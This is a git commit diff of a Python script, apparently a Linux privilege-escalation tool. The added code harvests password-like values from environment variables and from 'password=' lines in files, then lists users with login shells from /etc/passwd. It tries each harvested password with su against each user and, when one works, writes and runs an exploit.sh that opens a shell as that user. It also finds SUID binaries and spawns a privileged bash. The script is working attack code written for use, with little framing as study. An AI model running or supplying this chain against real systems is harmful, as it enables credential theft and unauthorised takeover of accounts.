d5e4cb216ac10b16bcbf795d625fba2ea8a57a64
Attaqr <132669955+Attaqr@users.noreply.github.com>
2024-05-26 21:33:32 +0200

    Update pe.py

--- pe.py
+++ pe.py
@@ -3,10 +3,17 @@ import os
 import grp
 import subprocess
 import getpass
-import time
-import sys
-import signal
 
+class Colors:
+    def __init__(self):
+        self.red =  '\033[31m'
+        self.reset = '\033[m'
+        self.blue = '\033[34m'
+        self.yellow = '\033[33m'
+        self.green = '\033[32m'
+        self.purple = '\033[35m'
+        self.bold = '\033[1m'
+        self.cyan = '\033[36m'
 
 class General_info:
     def __init__(self):
@@ -15,37 +22,87 @@ class General_info:
                 """
         print(art)
         self.pid = os.getpid()
-    def check_os(self):
+        self.colors = Colors()
+        self.keywords = ['docker', 'entrypoint']
+        self.binaries = [
+    '/bin/ls', '/usr/bin/ls',
+    '/bin/find', '/usr/bin/find',
+    '/bin/awk', '/usr/bin/awk',
+    '/bin/su', '/usr/bin/su',
+    '/bin/chmod', '/usr/bin/chmod',
+    '/bin/bash', '/usr/bin/bash',
+    '/bin/sudo']
+        self.found_binaries = []
+        self.missing_binaries = []
+    def sysinfo_fetcher(self):
         check = platform.system()
         if check != 'Linux':
-            print('[-] Your operating system is not supported')
+            print(f'{self.colors.red} [-] Your operating system is not supported {self.colors.reset}')
         else:
-            red =  '\033[31m'
-            reset = '\033[m'
-            blue = '\033[34m'
-            yellow = '\033[33m'
-            
-            print(f'[+] Spawned PID {yellow} + {self.pid}, {reset}')
+            print(f'{self.colors.green}{self.colors.bold}[+] Spawned PID {self.colors.yellow} + {self.pid}, {self.colors.reset}')
             osVersion = platform.version()
-            print(f'[+] Detected OS {yellow} + {osVersion}, {reset}')
+            print(f'{self.colors.green}{self.colors.bold}[+] Detected OS {self.colors.yellow} + {osVersion}, {self.colors.reset}')
             runningUser = getpass.getuser()
-            if runningUser == 'root':
-                 print(f'[+] Running as user {red} + {runningUser}, {reset}')
+            docker_cmd = 'ls -la /'
+            docker_container = subprocess.run(docker_cmd, shell=True, stdout=subprocess.PIPE, text=True)
+            if any(keyword in docker_container.stdout for keyword in self.keywords):
+                    print(f'{self.colors.green}{self.colors.bold}[+] Docker container: True{self.colors.reset}')
             else:
-                 print(f'[+] Running as user {blue} + {runningUser}, {reset}')
-                 
+                print(f'{self.colors.red}{self.colors.bold}[-] Docker container: False {self.colors.reset}')
+            for binary in self.binaries:
+                result = subprocess.run(['which', binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                if result.returncode == 0:
+                    self.found_binaries.append(binary)
+                else:
+                    self.missing_binaries.append(binary)
+            if not self.missing_binaries:
+                print(f'{self.colors.green}{self.colors.bold}[+] All binaries found {self.colors.reset}')
+            else:
+                print(f'{self.colors.red}{self.colors.bold}[-] Missing binaries: {self.colors.reset}{self.missing_binaries}')
+            if runningUser == 'root':
+                 print(f'{self.colors.green}{self.colors.bold}[+] Running as user {self.colors.red} + {runningUser}, {self.colors.reset}')
+            else:
+                 print(f'{self.colors.green}{self.colors.bold}[+] Running as user {self.colors.blue} + {runningUser}, {self.colors.reset}') 
             groupId = os.getgroups()
-            print(f'[+] Groups associated with user')
+            print(f'{self.colors.green}{self.colors.bold}[+] Groups associated with user {self.colors.reset}')
             for id in groupId:
                 groupInfo = grp.getgrgid(id)
                 groupName = groupInfo.gr_name
-                print(f'{blue} + {groupName}, {reset}')
-
-class Switch_user:
+                print(f'{self.colors.blue}{self.colors.bold} + {groupName}, {self.colors.reset}')
+        
+class Password_scanner:
     def __init__(self):
-        self.red =  '\033[31m'
-        self.reset = '\033[m'
-        self.blue = '\033[34m'
+        self.passwords = []
+        self.colors = Colors()
+    def check_env(self):
+        environmentVariables = os.environ
+        passwordVariables = [(key, value) for key, value in environmentVariables.items() if any(keyword in key.lower() or keyword in value.lower() for keyword in ['pass', 'password', 'psswrd', 'psswd', 'p@ss', 'p@ssword', 'ps'])]
+        if passwordVariables:
+            print(f"{self.colors.green}{self.colors.bold}[+] Passwords found in env! {self.colors.reset}")
+            for key, value in passwordVariables:
+                self.passwords.append(value)
+                print(f"{self.colors.cyan}{self.colors.bold} + {key}: {self.colors.cyan} + {value}, {self.colors.reset}")
+                return self.passwords
+        else:
+             print(f"{self.colors.red}{self.colors.bold}[-] No obvious passwords in env {self.colors.reset}")  
+             return          
+
+    def check_files(self):
+        output_list = []
+        command = "(find * -type f -exec awk -F\"'\" '/^password=/{gsub(/^password=/,\"\",$2); print $2}' {} + 2>/dev/null ; find * -type f -exec awk -F'\"' '/^password=/{gsub(/^password=/,\"\",$2); print $2}' {} + 2>/dev/null) | cat"
+        run = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, text=True)
+        if run.stdout is not None:
+            for line in run.stdout.split('\n'):
+                output_list.append(line)
+            output_list = [item for item in output_list if bool(item)]
+            print(f"{self.colors.green}{self.colors.bold}[+] Passwords found in files!{self.colors.cyan}{self.colors.bold} {output_list} {self.colors.reset}")
+            return output_list
+        else:
+            print(f"{self.colors.red}{self.colors.bold}[-] No obvious passwords found in files {self.colors.reset}")	
+    
+class User_scanner:
+    def __init__(self):
+        self.colors = Colors()
         self.shells = {
             '/bin/bash',
             '/bin/zsh',
@@ -63,67 +120,96 @@ class Switch_user:
             '/usr/bin/ksh',
             '/usr/bin/fish',
             '/usr/bin/zsh'}
-        self.passwords = []
-        self.pid = os.getpid()
-        
-        
-
-    def check_env(self):
-        environmentVariables = os.environ
-        passwordVariables = []
-        for key, value in environmentVariables.items():
-                    if any(keyword in key.lower() or keyword in value.lower() for keyword in ['pass', 'password', 'psswrd']):
-                        passwordVariables.append((key, value))
-
-        if passwordVariables:
-            print("[+] Passwords found!")
-            for key, value in passwordVariables:
-                self.passwords.append(value)
-                print(f"{self.red} + {key}: {self.red} +{value}, {self.reset}")
-        else:
-             print("No obvious passwords in env")             
 
     def check_users(self):
-        users = set()
+        users = []
         with open('/etc/passwd', 'r') as passwdFile:
              for line in passwdFile:
                   parts = line.split(':')
                   username, shell = parts[0], parts[-1].strip()
                   if any(shell in s for s in self.shells):
-                       users.add(username)       
+                       users.append(username)       
         if users:
-                 print(f'[+] Switching user')
-                 for user in users:  
-                    print(f'{self.blue} {user} {self.reset}')
-                    self.switch_user(user)
-                    
-    def switch_user(self, user):
-        if len(self.passwords) == 0:
-            print('No passwords found')
+                 print(f'{self.colors.green}{self.colors.bold}[+] Users found! {self.colors.cyan}{self.colors.bold}{users}')
+                 print(f'{self.colors.green}{self.colors.bold}[+] Switching user {self.colors.reset}')
+                 
+                 return users
+
+class User_switcher:
+    def __init__(self, passlist1, passlist2, users):
+        self.colors = Colors()
+        if passlist1 is None and passlist2 is None:
+            return
+        elif passlist1 is None:
+            self.passwords = passlist2
+        elif passlist2 is None:
+            self.passwords = passlist1
         else:
-            password = self.passwords[0]
-            try:
-             proc = subprocess.run(['/usr/bin/su', user], input=(password + '\n').encode(), check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-             if proc.returncode == 0:  
-                cmd = f"echo {password} | /usr/bin/su - {user} -c 'python3 -i -c \"import pty; pty.spawn(\\\"/bin/bash\\\")\"; kill {self.pid}'"
-                subprocess.run(cmd, shell=True, check=True)
-                
-                print('it worked')
-            except subprocess.CalledProcessError as e:
-                 time.sleep(0.2)
-                 print(f"Failed to switch to user {user}: {e}")
+            self.passwords = passlist1 + passlist2
+        self.user_list = users
+        self.pid = os.getpid()
+       
+    def switch_user(self):
+        if len(self.passwords) == 0:
+            print(f'{self.colors.red}{self.colors.bold}[-] No passwords found')
+        else:
+            for password in self.passwords:
+                for user in self.user_list:
+                    print(f"Trying password:{self.colors.cyan}{self.colors.bold} {password} {self.colors.reset}")
+                    try:
+                        proc = subprocess.run(['/usr/bin/su', user], input=(password + '\n').encode(), check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                        if proc.returncode == 0:
+                            print(f"{self.colors.green}{self.colors.bold}[+] We are able to escalate to user{self.colors.blue} {user} {self.colors.green}with password {self.colors.blue}{password} {self.colors.reset}")  
+                            # cmd = f"echo {password} | /usr/bin/su - {user} -c 'python3 -i -c \"import pty; pty.spawn(\\\"/bin/bash\\\")\"; kill {self.pid}'"
+                            with open("exploit.sh", "w") as f:
+                                f.write(f'#!/bin/bash\n')
+                                f.write(f'su -l -s /bin/bash {user}')
+                                f.close()
+                            subprocess.run('chmod +x exploit.sh', shell=True, check=True)
+                            subprocess.run('./exploit.sh', shell=True, check=True)
+                            break
+                    except subprocess.CalledProcessError as e:
+                        print(f"{self.colors.red}{self.colors.bold} Failed to switch to user {user} {self.colors.reset}")
 
+class Sudo_exploiter:
+    def __init__(self):
+        self.colors = Colors()
+    
+    def check_suid(self):
+        command = 'find / -perm -4000 -type f 2>/dev/null'
+        run = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
+        if 'bash' in run.stdout:
+            command = 'python3 -i -c \"import pty; pty.spawn(\\\"/bin/bash -p\\\")\";'
+            subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
+            print(run.stdout, end='')
+        else:
+            print(f'{self.colors.red}{self.colors.bold}[-] No SUID files found {self.colors.reset}')
 
+    def check_sudo(self):
+        command = f'sudo -l'
+        run = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
+        if run.returncode == 0:
+            print(f'{self.colors.green}{self.colors.bold}[+] User can run: {self.colors.cyan}{run.stdout}{self.colors.reset}')
+        else:
+            print(f'{self.colors.red}{self.colors.bold}[-] User does not have sudo access {self.colors.reset}')
 
-if __name__ == "__main__":
-     obj1 = General_info()
-     obj1.check_os()
-     obj2 = Switch_user()
-     obj2.check_env()
-     obj2.check_users()
-     
+    def fetch_gtfo(self):
+        pass
 
-     
+def main():
+    general_info = General_info()
+    general_info.sysinfo_fetcher()
+    password_scanner = Password_scanner()
+    l1 = password_scanner.check_env()
+    l2 = password_scanner.check_files()
+    user_scanner = User_scanner()
+    users = user_scanner.check_users()
+    user_switcher = User_switcher(l1, l2, users)
+    user_switcher.switch_user()
+    # sudo_exploiter = Sudo_exploiter()
+    # sudo_exploiter.check_sudo()
+
+main()
 
 
 
